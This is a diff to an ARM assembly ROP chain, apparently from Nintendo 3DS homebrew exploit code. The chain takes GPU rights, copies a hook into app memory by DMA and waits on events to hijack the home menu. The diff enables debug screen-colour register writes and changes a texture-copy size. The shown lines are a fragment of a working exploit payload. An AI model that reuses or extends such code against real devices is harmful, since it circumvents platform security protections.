@@ -51,7 +51,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	rop: ; real ROP starts here
 
 		; debug
-			;writehwreg 0x202A04, 0x01FFFFFF
+			writehwreg 0x202A04, 0x01FFFFFF
 
 		; looks like this is actually not needed
 		; plug dsp handle leak
@@ -133,7 +133,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		; flush app_code because we just wrote to it and are about to DMA it
 			flush_dcache MENU_OBJECT_LOC + appCode, 0x4000
 
-			;writehwreg 0x202A04, 0x0100FF00
+			writehwreg 0x202A04, 0x0100FF00
 			
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
@@ -156,7 +156,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		; sleep for a bit
 			sleep 200*1000*1000, 0x00000000
 
-			;writehwreg 0x202A04, 0x0100FFFF
+			writehwreg 0x202A04, 0x0100FFFF
 
 		; release gsp rights
 			gsp_release_right
@@ -205,7 +205,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0x01000004 ; command header (SetTextureCopy)
 		.word MENU_OBJECT_LOC + appHook - object ; source address
 		.word 0xDEADBABE ; destination address (standin, will be filled in)
-		.word 0x00000200 ; size
+		.word 0x00000100 ; size
 		.word 0xFFFFFFFF ; dim in
 		.word 0xFFFFFFFF ; dim out
 		.word 0x00000008 ; flags
@@ -361,7 +361,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 				load_store MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_marker + 4, MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_marker - 4
 
 			waitLoop_keycomboend:
-			
+
 			; check event
 			wait_synchronizationn DUMMY_PTR, MENU_EVENTHANDLE_PTR, 1, 1, 1000*1000, 0, 1, WAITLOOP_OFFSET
 
@@ -560,7 +560,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 				.word 0x000000FF ; by default we do nothing with the n3ds cpu config
 				.word 0x00000000
 			gsp_acquire_right
-			;writehwreg 0x202A04, 0x01FF00FF
+			writehwreg 0x202A04, 0x01FF00FF
 			; todo : add cache invalidation for ropbin
 			sleep 100*1000*1000, 0x00000000
 	waitLoop_end:
